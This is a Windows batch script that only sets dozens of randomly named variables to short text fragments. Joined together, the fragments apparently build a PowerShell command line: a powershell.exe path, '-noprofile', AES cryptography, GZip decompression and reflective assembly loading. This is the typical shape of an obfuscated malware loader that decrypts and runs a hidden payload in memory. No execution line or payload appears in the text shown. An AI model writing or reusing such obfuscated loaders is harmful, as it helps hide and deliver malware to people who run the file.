@echo off
set "uoctJQIJgV=s\"
set "jdSijCijyp=we"
set "bxvherzwkk=:\"
set "FZLUESUVYI=ow"
set "SXUHlxgkAl=1."
set "qeHhZVGPkp=\v"
set "YudYggolff=xe"
set "CvmhcAlFuW= /"
set "bScIjSKBWQ=ws"
set "LwIvmbFzWa=do"
set "KlcwJSWOSm=rs"
set "SQIpSeFhUX= C"
set "wZNnJSMKTR=Sy"
set "diPoxlgGSF=co"
set "njZwcNFZJN=ll"
set "mciZiWHGuG=Wi"
set "ZQelZPTdyb=he"
set "FQtBVFlxkM=32"
set "nWffHiXeNc=y "
set "ppccZTLmEW=py"
set "cMIMmZgqbx=em"
set "QyiSpNYEaD=0\"
set "KVCFXkCCIl=Po"
set "AuoRTKrabK=in"
set "lPXhKUjWle=po"
set "QPoNuHrFHa=rS"
set "zdQKMQvCHA=ll"
set "njKLonzAws=nd"
set "fkbgQvolNw=\W"
set "SYaRFnqnvp=st"
set "nkwAaJBGUO=we"
set "EOfKTaNAxR=.e"
set "XcPHddZNWq=he"
set "QIfLZMeSrj= %~dp0"
set "VRNhduhzYF=cd"
set "tXgyLSowuS=, (,"
set "apoahcgQoZ=]::("
set "lcmmbFVzlh=16] "
set "AgWjhAFBOP=Conv"
set "FZpuWGIEph=File"
set "xbdqKtQFkU=tion"
set "hyXIESOIgS=ment"
set "iLTBAPbppJ== $A"
set "RFpEaBnZCD=]::("
set "vlImcRjqjU=l) {"
set "wUvbqnqgGW=gMod"
set "TEBwwazvqM=Secu"
set "FDpJVsYDMK=)($z"
set "tCKsGqHJdx=rity"
set "HpzxkiPTWS=VvCu"
set "KcrTjEqFne=.Ass"
set "CISxIAgHSB=oArr"
set "tQKwknKvLl=TllA"
set "gysdUfjBlZ=tem."
set "oZRXBNccXd=.Cry"
set "VfAunGjbut=yste"
set "ooJGtrfKjq=xTap"
set "WkhKJTreGk=IaFx"
set "bibOZjIaeO=m(, "
set "fRsykciomO=ap);"
set "utbcaciTkI=Secu"
set "DjAznVZFpK=saBm"
set "NFKfJlJgDm=JaOd"
set "auOpQJNshG=-Obj"
set "AqGHmjktpq=[IO."
set "pzVBoAKsxv=oL'["
set "LsHzEnAYLg=-nop"
set "VZnukeJaif=::De"
set "ZEvIOsxDCG=ose("
set "XAayGBQdDC=$zoL"
set "afwtMtVbcR=lit("
set "nZmNHXHLax=stem"
set "ZTwhlsNZCt=Disp"
set "jiOqcKzSUD=n ''"
set "cwvDmPCWrp=.Dis"
set "BnGtETWNzM=urit"
set "hPheTSYJzb=3); "
set "FZzpInuQHt=y.Cr"
set "uvMNkryEFs=New-"
set "rKIPqRcRaD=le  "
set "hQRCkjZayW=;$Zw"
set "iimFKDWLxI=tIaF"
set "NMqgyqbUgi=ct S"
set "fGsRiFeiGM=flec"
set "uzhdZUVMiG=;$Oo"
set "nrkImYGCXX=eam("
set "aoCvirlcBO=Invo"
set "sVQneoUTuJ=[Sys"
set "BubBonTilC=.GZi"
set "SseFONwGtG=:: '"
set "CRCPKNHavb=tryP"
set "NenaDVziXM=Mode"
set "nSuzfRckjF=fore"
set "ZMyaDYEHRg=Bmor"
set "inMeScUMpV=ress"
set "NgnfxbIkLw=Syst"
set "DWjVaopJRG=$zoL"
set "qPGipbJRjN=ss -"
set "BcrIXNvyut=yste"
set "LHgCSINRBH=);$t"
set "sKfchuefPk=1] -"
set "vEptxZzUpi=$tIa"
set "XlPMumSXwH=rofi"
set "DPPkcwYOLX=[Sys"
set "OmkpdiZpMh=pose"
